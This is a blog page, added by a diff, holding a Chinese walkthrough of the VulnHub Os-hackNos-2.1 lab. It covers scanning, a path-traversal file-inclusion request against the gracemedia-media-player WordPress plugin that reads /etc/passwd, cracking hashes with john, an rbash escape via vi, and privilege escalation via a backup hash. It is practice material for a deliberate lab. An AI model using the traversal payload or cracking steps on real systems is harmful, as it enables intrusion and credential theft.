@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_Os-hackNos-2.1靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_Os-hackNos-2.1靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-07-10&nbsp;&nbsp;23:47:27</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该在VMware中使用有点问题，没法正常分配IP，所以我是在VirtualBox中完成的。</p>
+<p>攻击机ip：192.168.1.29</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>上nmap扫描目标主机，得到靶机ip为192.168.1.28。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.1.1&#x2F;24</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-09 21:21 EDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.013s latency).</span><br><span class="line">Nmap scan report for 192.168.1.4</span><br><span class="line">Host is up (0.041s latency).</span><br><span class="line">Nmap scan report for 192.168.1.16</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Nmap scan report for 192.168.1.28</span><br><span class="line">Host is up (0.0030s latency).</span><br><span class="line">Nmap scan report for 192.168.1.29</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 2.44 seconds</span><br></pre></td></tr></table></figure>
+
+<p>继续扫描目标主机上的服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.1.28</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-09 21:26 EDT</span><br><span class="line">Nmap scan report for 192.168.1.28</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现了http服务和ssh服务。</p>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>访问目标web站点，是apache服务的配置信息页面：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/1.png" alt="1"></p>
+<p>那接着拿dirb扫一下网站目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.1.28</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jul  9 23:43:56 2020</span><br><span class="line">URL_BASE: http://192.168.1.28/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.28/ ----</span><br><span class="line">+ http://192.168.1.28/index.html (CODE:200|SIZE:10918)</span><br><span class="line">+ http://192.168.1.28/server-status (CODE:403|SIZE:277)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/index.php (CODE:301|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-content/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-includes/</span><br><span class="line">+ http://192.168.1.28/tsweb/xmlrpc.php (CODE:405|SIZE:42)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/admin.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/css/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/images/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/includes/</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/index.php (CODE:302|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/js/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/maint/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/network/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-admin/user/     </span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-content/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-content/index.php (CODE:200|SIZE:0)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-content/plugins/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-content/themes/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-content/upgrade/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.28/tsweb/wp-content/uploads/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it. </span><br><span class="line">	(Use mode '-w' if you want to scan it anyway)</span><br><span class="line"> </span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"> </span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">  </span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">  </span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">  </span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/network/admin.php (CODE:302|SIZE:0)  </span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/network/index.php (CODE:302|SIZE:0)\</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/user/admin.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-admin/user/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-content/plugins/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.1.28/tsweb/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-content/upgrade/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.1.28/tsweb/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jul  9 23:44:08 2020</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 13</span><br></pre></td></tr></table></figure>
+
+<p>从上面的扫描结果可以看出的是，网站的根目录是<code>http://192.168.1.28/tsweb</code>，并且这是一个wordpress站点：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/2.png" alt="2"></p>
+<p>既然是wordpress站点，那就用<code>wpscan</code>进行扫描：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/3.png" alt="3"></p>
+<p>发现了一个插件<code>gracemedia-media-player</code>，在cve官网上搜索过后发现了<code>CVE-2019-9618</code>：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/4.png" alt="4"></p>
+<p>这是一个文件包含漏洞，查看源码发现完全没有对用户的输入进行检查就进行了require_once操作从而导致了任意文件包含：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/17.png" alt="17"></p>
+<p>利用方式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;templates&#x2F;files&#x2F;ajax_controller.php?ajaxAction&#x3D;getIds&amp;cfg&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/5.png" alt="5"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rohit:x:1000:1000:hackNos:&#x2F;home&#x2F;rohit:&#x2F;bin&#x2F;bash</span><br><span class="line">flag:$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;:1001:1003::&#x2F;home&#x2F;flag:&#x2F;bin&#x2F;rbash</span><br></pre></td></tr></table></figure>
+
+<p><code>flag</code>用户的密码是经过加密的，送到<code>john</code>中爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/6.png" alt="6"></p>
+<p>很快就得到flag用户的密码：<code>topsecret</code>。</p>
+<h2 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h2><p>从前面的<code>/etc/passwd</code>文件就知道，当前的用户的bash是<code>/bin/rbash</code>，很多命令是被禁止的，所以需要绕过rbash。绕过rbash的方法在<a href="https://bantttian.github.io/2020/06/22/VulnHub_DC-2/#%E7%BB%95%E8%BF%87rbash">靶场DC-2</a>中有学习过。</p>
+<p>因为<code>vi</code>命令是可以使用的，所以可以利用<code>vi</code>绕过。首先在vi编辑器中设置shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set shell&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/8.png" alt="8"></p>
+<p>然后调用该shell，并回车：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/9.png" alt="9"></p>
+<p>就可以看到当前的shell变成了bash：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/10.png" alt="10"></p>
+<p>但是当前用户的权限还是不够，接下去要进行提权。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先<code>sudo -l</code>查看当前用户可以sudo执行的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag@hacknos:&#x2F;$ sudo -l</span><br><span class="line">[sudo] password for flag: </span><br><span class="line">Sorry, user flag may not run sudo on hacknos.</span><br></pre></td></tr></table></figure>
+
+<p>flag用户没有执行sudo的权限。接着我们找一下有没有suid权限的文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">flag@hacknos:&#x2F;$ find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;9436&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br></pre></td></tr></table></figure>
+
+<p>这里面有一个<code>/usr/bin/at</code>，我搜索了下确实存在漏洞，但是版本对照不上，所以利用suid提权的方法也走不太通。</p>
+<p>再看看当前的系统内核版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag@hacknos:&#x2F;$ uname -a</span><br><span class="line">Linux hacknos 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
+
+<p>是<code>ubuntu-4.15.0</code>，在exploit上搜到了一个可能可用的exp： <a href="https://www.exploit-db.com/exploits/47163" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47163</a> ，但是没法编译，因为没有gcc：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/11.png" alt="11"></p>
+<p>然后我考虑在另一台ubuntu16.04编译好，然后下载到目标主机上，但是这样也还是不行：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/12.png" alt="12"></p>
+<p>尝试了三种最常见的提权手法都失败了之后，我被卡住了。然后我去找了别人的wp，说是在<code>/var</code>目录下有备份文件：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/13.png" alt="13"></p>
+<p>发现了md5加密的hash文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure>
+
+<p>送到john解密，得到了密码<code>!%hack41</code>：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/14.png" alt="14"></p>
+<p>前面我们从<code>/etc/passwd</code>文件可以看到还有一个用户<code>rohit</code>，可能这个就是该用户的密码，尝试切换用户发现能成功切换。</p>
+<p><code>sudo -l</code>查看发现该用户能够使用sudo执行所有命令：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/15.png" alt="15"></p>
+<p>所以直接查看<code>/root</code>目录，并读取该目录下的flag：</p>
+<p><img src="/2020/07/10/VulnHub_Os-hackNos-2.1/imgs/16.png" alt="16"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这个靶机可能还是想说需要多关注一下<code>/var</code>目录，可能里面会有一些意想不到的收获。</p>
+
